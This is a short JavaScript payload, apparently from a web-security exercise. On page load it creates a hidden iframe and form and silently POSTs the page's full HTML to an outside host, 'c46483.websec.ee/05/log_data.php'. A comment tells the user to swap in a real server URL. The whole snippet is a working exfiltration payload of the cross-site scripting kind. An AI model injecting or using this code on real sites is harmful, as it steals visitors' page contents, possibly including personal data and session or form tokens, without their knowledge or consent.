document.addEventListener("DOMContentLoaded", function() {
    var iframe = document.createElement("iframe");
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    setTimeout(() => {
        var doc = iframe.contentWindow.document;
        var form = doc.createElement("form");
        form.action = "https://c46483.websec.ee/05/log_data.php";  // Use your real server URL
        form.method = "POST";

        var input = doc.createElement("input");
        input.type = "hidden";
        input.name = "data";
        input.value = document.body.innerHTML;

        form.appendChild(input);
        doc.body.appendChild(form);
        form.submit();
    }, 100);
});